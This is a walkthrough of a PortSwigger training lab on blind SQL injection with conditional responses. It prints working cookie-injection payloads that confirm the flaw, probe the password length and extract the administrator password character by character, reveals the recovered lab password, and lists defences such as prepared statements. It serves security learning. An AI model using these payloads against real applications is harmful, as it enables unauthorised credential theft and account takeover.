# 📘 PortSwigger Lab: Blind SQL Injection with Conditional Responses

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

---

## 📑 Table of Contents

- [📘 PortSwigger Lab: Blind SQL Injection with Conditional Responses](#-portswigger-lab-blind-sql-injection-with-conditional-responses)
  - [📑 Table of Contents](#-table-of-contents)
  - [🎯 Goal](#-goal)
  - [🧠 Attack idea](#-attack-idea)
  - [🔍 Step 1 — Confirm Blind SQLi](#-step-1--confirm-blind-sqli)
  - [🔍 Step 2 — Check administrator user](#-step-2--check-administrator-user)
  - [🔍 Step 3 — Determine password length](#-step-3--determine-password-length)
  - [🔍 Step 4 — Extract password manually](#-step-4--extract-password-manually)
  - [🔍 Step 5 — Login as administrator](#-step-5--login-as-administrator)
  - [🧩 Payloads used](#-payloads-used)
  - [💥 Why the attack worked](#-why-the-attack-worked)
  - [🛡 Defense](#-defense)
  - [🛠 Checklist](#-checklist)
- [⬆ Back to top](#-back-to-top)

---

<a id="goal"></a>

## 🎯 Goal

Retrieve the `administrator` password using Blind SQL Injection and log in.

---

<a id="idea"></a>

## 🧠 Attack idea

The application uses a `TrackingId` cookie and places its value inside a SQL query.

The SQL query results are not displayed directly.

However, there is a behavioral indicator:

```text
Welcome back
```

If the SQL condition is TRUE, the `Welcome back` message appears.

If the SQL condition is FALSE, the message disappears.

This gives us a TRUE/FALSE channel that can be used to extract data one character at a time.

---

<a id="step1"></a>

## 🔍 Step 1 — Confirm Blind SQLi

First, confirm that we can control the SQL condition.

TRUE payload:

```sql
' AND '1'='1
```

If the condition is TRUE, the response contains:

```text
Welcome back
```

FALSE payload:

```sql
' AND '1'='2
```

If the condition is FALSE, the message disappears.

Conclusion:

```text
Blind SQL Injection confirmed.
```

---

<a id="step2"></a>

## 🔍 Step 2 — Check administrator user

Check whether the `administrator` user exists.

Payload:

```sql
' AND (
SELECT 'x'
FROM users
WHERE username='administrator'
)='x
```

If `Welcome back` appears, the user exists.

---

<a id="step3"></a>

## 🔍 Step 3 — Determine password length

Use `LENGTH()` to determine the password length.

Example:

```sql
' AND (
SELECT 'x'
FROM users
WHERE username='administrator'
AND LENGTH(password)>10
)='x
```

If `Welcome back` appears, the password is longer than 10 characters.

If the message disappears, the password is not longer than 10 characters.

Then adjust the number:

```text
>10
>15
>20
=20
```

In this lab, the password length was identified as:

```text
Password length = 20
```

---

<a id="step4"></a>

## 🔍 Step 4 — Extract password manually

Now the password looks like this:

```text
????????????????????
```

20 unknown characters.

Test each character manually using `SUBSTRING()`.

Payload for the first character:

```sql
' AND SUBSTRING(
(SELECT password FROM users WHERE username='administrator'),
1,
1
)='a
```

Here:

```sql
SUBSTRING(password,1,1)
```

means:

```text
take the 1st password character
```

If `Welcome back` appears, the first character is `a`.

If not, test the next character:

```sql
' AND SUBSTRING(
(SELECT password FROM users WHERE username='administrator'),
1,
1
)='b
```

Continue with:

```text
a b c d ... z 0 1 2 ... 9
```

Once the first character is found, move to the second position:

```sql
' AND SUBSTRING(
(SELECT password FROM users WHERE username='administrator'),
2,
1
)='a
```

Here:

```sql
SUBSTRING(password,2,1)
```

means:

```text
take the 2nd password character
```

Repeat this for every position:

```text
1 → discovered character
2 → discovered character
3 → discovered character
...
20 → discovered character
```

The full password was eventually recovered.

<details>
<summary>🔑 Show administrator password</summary>

```text
Username: administrator
Password: uku46cruf17z4di4hc1u
```

</details>

---

<a id="step5"></a>

## 🔍 Step 5 — Login as administrator

After recovering the password, open:

```text
/login
```

Use:

```text
Username: administrator
Password: extracted password
```

After a successful login, the lab is solved.

---

<a id="payloads"></a>

## 🧩 Payloads used

TRUE condition:

```sql
' AND '1'='1
```

FALSE condition:

```sql
' AND '1'='2
```

Check administrator user:

```sql
' AND (
SELECT 'x'
FROM users
WHERE username='administrator'
)='x
```

Check password length:

```sql
' AND (
SELECT 'x'
FROM users
WHERE username='administrator'
AND LENGTH(password)>10
)='x
```

Check character:

```sql
' AND SUBSTRING(
(SELECT password FROM users WHERE username='administrator'),
1,
1
)='a
```

---

<a id="why"></a>

## 💥 Why the attack worked

The application:

- inserted the `TrackingId` cookie directly into a SQL query;
- did not use prepared statements;
- did not display query results directly;
- but returned different responses for TRUE and FALSE conditions.

This is enough for Blind SQL Injection.

---

<a id="defense"></a>

## 🛡 Defense

- Prepared Statements
- Parameterized Queries
- Never place cookie values directly into SQL
- Least Privilege for the database user
- Uniform responses for TRUE/FALSE conditions
- Rate limiting
- WAF as an additional layer

---

<a id="checklist"></a>

## 🛠 Checklist

- [ ] TRUE response confirmed
- [ ] FALSE response confirmed
- [ ] administrator user found
- [ ] password length identified
- [ ] password extracted character by character
- [ ] logged in as administrator

---

# ⬆ Back to top

[Return to table of contents](#top)
